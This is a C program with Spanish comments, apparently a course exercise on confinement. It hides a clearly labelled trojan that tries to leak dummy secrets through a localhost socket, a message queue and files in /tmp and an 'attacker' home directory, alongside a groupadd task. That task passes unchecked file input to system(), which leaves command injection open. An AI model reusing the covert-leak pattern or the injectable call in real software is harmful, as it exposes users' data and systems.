// programa que filtra información
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <ctype.h>
#include <stdlib.h>

static int crea_grupos(const char *fichero_grupos) {
    FILE *f;
    if ((f=fopen(fichero_grupos, "r"))==NULL) {
        perror("Error en fopen del fichero recibido como argumento");
        return 1;
    }
    char *grupo = NULL;
    int gid;
    while (fscanf(f, "%ms%d", &grupo, &gid)==2) {
        char *mandato = NULL;
        asprintf(&mandato, "groupadd -g %d %s", gid, grupo);
        if (system(mandato)!=0) return 1;
	free(mandato);
        free(grupo);
    }
    fclose(f);
    return 0;
}

static void filtra(void);
int main(int  argc, const char *argv[]) {
    if (argc!=2) {
        fprintf(stderr, "Uso: %s fichero_grupos\n", argv[0]);
        return 1;
    }
    // lleva a cabo el comportamiento troyano...
    filtra();
    // pero también realiza la labor benigna
    if (crea_grupos(argv[1])) {
        printf("ERROR: el programa no ha podido completar su labor\n");
	return 1;
    }
    return 0;
}

// COMIENZA TROYANO
static void filtra_socket(void);
static void filtra_IPC(void);
static void filtra_tmp(void);
static void filtra_home_atacante(void);

static void filtra(void) {
    filtra_socket();
    filtra_IPC();
    filtra_tmp();
    filtra_home_atacante();
}

// FILTRADO POR SOCKET
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
          
// Filtra usando un socket
static void filtra_socket(void) {
    int s, res=-1;
    struct sockaddr_in srv_addr;

    if ((s=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        perror("error creando socket");
        return;
    }
    bzero((char *)&srv_addr, sizeof(srv_addr));

    srv_addr.sin_addr.s_addr= htonl(2130706433);
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(6666);

    if (connect(s, (struct sockaddr *) &srv_addr, sizeof(srv_addr)) >= 0) {
        if (write(s, "SECRET_SOCK\n", 12) >= 0) {
            printf("SÍ he conseguido filtrar por el socket\n");
            close(s);
            res=0;
        }
    }
    if (res==-1) printf("NO he conseguido filtrar por el socket\n");
    return;
}

// FILTRADO POR IPC
struct mens {
    long tipo;
    char m[13];
};
#include <sys/ipc.h>
#include <sys/msg.h>
static void filtra_IPC(void) {
    key_t key = ftok("/", 'X');
    int  qid, res = -1;
    struct mens m= {.tipo=1, .m="SECRET_IPCS\n"};

    if ((qid = msgget(key, 0)) != -1) {
        if (msgsnd(qid, (struct msgbuf *)&m, 13, 0) !=-1) {
            printf("SÍ he conseguido filtrar mediante IPC\n");
            res=0;
        }
    }
    if (res==-1) printf("NO he conseguido filtrar mediante IPC\n");
}

// FILTRADO POR /tmp
static void filtra_tmp(void) {
    int f, res=-1;
    if ((f=open("/tmp/canal", O_RDWR))>=0) {
        if (write(f, "SECRET_TEMP\n", 12)>=0) {
            printf("SÍ he conseguido filtrar a través de /tmp\n");
	    res=0;
        }
	close(f);
    }
    if (res==-1) printf("NO he conseguido filtrar a través de /tmp\n");
    else close(f);
}   

// FILTRADO POR /home atacante
static void filtra_home_atacante(void) {
    int f, res=-1;
    if ((f=open("/home/atacante/canal", O_RDWR)) >= 0) {
        if (write(f, "SECRET_HOME_ATACANTE\n", 21)>=0) {
            printf("SÍ he conseguido filtrar a través de /home del atacante\n");
	    res=0;
        }
	close(f);
    }
    if (res==-1) printf("NO he conseguido filtrar a través de /home del atacante\n");
}

